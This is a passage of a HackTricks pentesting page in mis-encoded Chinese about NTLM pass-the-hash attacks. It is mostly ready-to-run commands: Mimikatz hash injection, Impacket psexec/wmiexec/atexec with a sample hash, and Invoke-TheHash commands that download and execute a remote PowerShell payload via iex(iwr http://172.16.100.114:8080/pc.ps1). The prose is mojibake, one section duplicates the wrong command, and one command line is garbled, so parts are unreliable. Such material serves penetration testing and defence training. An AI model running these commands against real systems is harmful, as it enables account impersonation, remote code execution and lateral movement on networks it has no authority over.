<p>å¦‚æœä½ æœ‰ä¸€ä¸ª<strong>æ•è·äº†æˆåŠŸèº«ä»½éªŒè¯è¿‡ç¨‹çš„ pcap</strong>ï¼Œä½ å¯ä»¥æŒ‰ç…§æœ¬æŒ‡å—è·å–åŸŸã€ç”¨æˆ·åã€æŒ‘æˆ˜å’Œå“åº”ï¼Œå¹¶å°è¯•ç ´è§£å¯†ç ï¼š<a href="https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/">https://research.801labs.org/cracking-an-ntlmv2-hash/</a></p>
<h2 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass-the-Hash</a></h2>
<p><strong>ä¸€æ—¦ä½ æ‹¥æœ‰å—å®³è€…çš„å“ˆå¸Œå€¼</strong>ï¼Œä½ å¯ä»¥ç”¨å®ƒæ¥<strong>å†’å……</strong>å—å®³è€…ã€‚<br />
ä½ éœ€è¦ä½¿ç”¨ä¸€ä¸ª<strong>å·¥å…·</strong>ï¼Œè¯¥å·¥å…·å°†<strong>ä½¿ç”¨</strong>è¯¥<strong>å“ˆå¸Œ</strong>è¿›è¡Œ<strong>NTLM èº«ä»½éªŒè¯</strong>ï¼Œ<strong>æˆ–è€…</strong>ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„<strong>sessionlogon</strong>å¹¶å°†è¯¥<strong>å“ˆå¸Œ</strong>æ³¨å…¥åˆ°<strong>LSASS</strong>ä¸­ï¼Œè¿™æ ·å½“ä»»ä½•<strong>NTLM èº«ä»½éªŒè¯è¢«æ‰§è¡Œ</strong>æ—¶ï¼Œè¯¥<strong>å“ˆå¸Œå°†è¢«ä½¿ç”¨</strong>ã€‚æœ€åä¸€ä¸ªé€‰é¡¹å°±æ˜¯ mimikatz æ‰€åšçš„ã€‚</p>
<p><strong>è¯·è®°ä½ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è®¡ç®—æœºå¸æˆ·æ‰§è¡Œ Pass-the-Hash æ”»å‡»ã€‚</strong></p>
<h3 id="mimikatz"><a class="header" href="#mimikatz"><strong>Mimikatz</strong></a></h3>
<p><strong>éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ</strong></p>
<pre><code class="language-bash">Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
</code></pre>
<p>è¿™å°†å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹å°†å±äºå¯åŠ¨äº† mimikatz çš„ç”¨æˆ·ï¼Œä½†åœ¨ LSASS å†…éƒ¨ï¼Œä¿å­˜çš„å‡­æ®æ˜¯ mimikatz å‚æ•°ä¸­çš„å†…å®¹ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥åƒè¯¥ç”¨æˆ·ä¸€æ ·è®¿é—®ç½‘ç»œèµ„æºï¼ˆç±»ä¼¼äº <code>runas /netonly</code> æŠ€å·§ï¼Œä½†æ‚¨ä¸éœ€è¦çŸ¥é“æ˜æ–‡å¯†ç ï¼‰ã€‚</p>
<h3 id="ä»-linux-è¿›è¡Œ-pass-the-hash"><a class="header" href="#ä»-linux-è¿›è¡Œ-pass-the-hash">ä» Linux è¿›è¡Œ Pass-the-Hash</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ Linux ä» Windows æœºå™¨ä¸­è·å¾—ä»£ç æ‰§è¡Œã€‚<br />
<a href="https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md"><strong>è®¿é—®æ­¤å¤„äº†è§£å¦‚ä½•æ“ä½œã€‚</strong></a></p>
<h3 id="impacket-windows-ç¼–è¯‘å·¥å…·"><a class="header" href="#impacket-windows-ç¼–è¯‘å·¥å…·">Impacket Windows ç¼–è¯‘å·¥å…·</a></h3>
<p>æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries"> Windows çš„ impacket äºŒè¿›åˆ¶æ–‡ä»¶</a>ã€‚</p>
<ul>
<li><strong>psexec_windows.exe</strong> <code>C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local</code></li>
<li><strong>wmiexec.exe</strong> <code>wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local</code></li>
<li><strong>atexec.exe</strong>ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦æŒ‡å®šä¸€ä¸ªå‘½ä»¤ï¼Œcmd.exe å’Œ powershell.exe ä¸æ˜¯æœ‰æ•ˆçš„ä»¥è·å¾—äº¤äº’å¼ shellï¼‰<code>C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'</code></li>
<li>è¿˜æœ‰æ›´å¤š Impacket äºŒè¿›åˆ¶æ–‡ä»¶...</li>
</ul>
<h3 id="invoke-thehash"><a class="header" href="#invoke-thehash">Invoke-TheHash</a></h3>
<p>æ‚¨å¯ä»¥ä»è¿™é‡Œè·å– powershell è„šæœ¬ï¼š<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<h4 id="invoke-smbexec"><a class="header" href="#invoke-smbexec">Invoke-SMBExec</a></h4>
<pre><code class="language-bash">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
</code></pre>
<h4 id="invoke-wmiexec"><a class="header" href="#invoke-wmiexec">Invoke-WMIExec</a></h4>
<pre><code class="language-bash">Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
</code></pre>
<h4 id="invoke-smbclient"><a class="header" href="#invoke-smbclient">Invoke-SMBClient</a></h4>
<pre><code class="language-bash">Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
</code></pre>
<h4 id="invoke-smbenum"><a class="header" href="#invoke-smbenum">Invoke-SMBEnum</a></h4>
<pre><code class="language-bash">Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
</code></pre>
<h4 id="invoke-thehash-1"><a class="header" href="#invoke-thehash-1">Invoke-TheHash</a></h4>
<p>è¿™ä¸ªåŠŸèƒ½æ˜¯<strong>æ‰€æœ‰å…¶ä»–åŠŸèƒ½çš„æ··åˆ</strong>ã€‚æ‚¨å¯ä»¥ä¼ é€’<strong>å¤šä¸ªä¸»æœº</strong>ï¼Œ<strong>æ’é™¤</strong>æŸäº›ä¸»æœºï¼Œå¹¶<strong>é€‰æ‹©</strong>æ‚¨æƒ³è¦ä½¿ç”¨çš„<strong>é€‰é¡¹</strong>ï¼ˆ<em>SMBExec, WMIExec, SMBClient, SMBEnum</em>ï¼‰ã€‚å¦‚æœæ‚¨é€‰æ‹©<strong>ä»»ä½•</strong>çš„<strong>SMBExec</strong>å’Œ<strong>WMIExec</strong>ä½†æ‚¨<strong>æ²¡æœ‰</strong>æä¾›ä»»ä½•_<strong>Command</strong>_å‚æ•°ï¼Œå®ƒå°†ä»…ä»…<strong>æ£€æŸ¥</strong>æ‚¨æ˜¯å¦æ‹¥æœ‰<strong>è¶³å¤Ÿçš„æƒé™</strong>ã€‚</p>
<pre><code>Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
</code></pre>
<h3 id="evil-winrm-pass-the-hash"><a class="header" href="#evil-winrm-pass-the-hash"><a href="../../network-services-pentesting/5985-5986-pentesting-winrm.html#using-evil-winrm">Evil-WinRM Pass the Hash</a></a></h3>
<h3 id="windows-credentials-editor-wce"><a class="header" href="#windows-credentials-editor-wce">Windows Credentials Editor (WCE)</a></h3>
<p><strong>éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ</strong></p>
<p>æ­¤å·¥å…·å°†æ‰§è¡Œä¸mimikatzç›¸åŒçš„æ“ä½œï¼ˆä¿®æ”¹LSASSå†…å­˜ï¼‰ã€‚</p>
<pre><code>wce.exe -s &lt;username&gt;:&lt;domain&gt;:&lt;hash_lm&gt;:&lt;hash_nt&gt;
</code></pre>
<h3 id="æ‰‹åŠ¨windowsè¿œç¨‹æ‰§è¡Œç”¨æˆ·åå’Œå¯†ç "><a class="header" href="#æ‰‹åŠ¨windowsè¿œç¨‹æ‰§è¡Œç”¨æˆ·åå’Œå¯†ç ">æ‰‹åŠ¨Windowsè¿œç¨‹æ‰§è¡Œç”¨æˆ·åå’Œå¯†ç </a></h3>
<p>{% content-ref url="../lateral-movement/" %}
<a href="../lateral-movement/">lateral-movement</a>
{% endcontent-ref %}</p>
<h2 id="ä»windowsä¸»æœºæå–å‡­æ®"><a class="header" href="#ä»windowsä¸»æœºæå–å‡­æ®">ä»Windowsä¸»æœºæå–å‡­æ®</a></h2>
<p><strong>æœ‰å…³å¦‚ä½•ä»Windowsä¸»æœºè·å–å‡­æ®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»</strong> <a href="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md"><strong>æ­¤é¡µé¢</strong></a><strong>ã€‚</strong></p>
<h2 id="ntlmä¸­ç»§å’Œå“åº”è€…"><a class="header" href="#ntlmä¸­ç»§å’Œå“åº”è€…">NTLMä¸­ç»§å’Œå“åº”è€…</a></h2>
<p><strong>åœ¨è¿™é‡Œé˜…è¯»æœ‰å…³å¦‚ä½•æ‰§è¡Œè¿™äº›æ”»å‡»çš„è¯¦ç»†æŒ‡å—ï¼š</strong></p>
<p>{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
<a href="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md</a>
{% endcontent-ref %}</p>
<h2 id="ä»ç½‘ç»œæ•è·ä¸­è§£æntlmæŒ‘æˆ˜"><a class="header" href="#ä»ç½‘ç»œæ•è·ä¸­è§£æntlmæŒ‘æˆ˜">ä»ç½‘ç»œæ•è·ä¸­è§£æNTLMæŒ‘æˆ˜</a></h2>
<p><strong>æ‚¨å¯ä»¥ä½¿ç”¨</strong> <a href="https://github.com/mlgualtieri/NTLMRawUnHide"><strong>https://github.com/mlgualtieri/NTLMRawUnHide</strong></a></p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
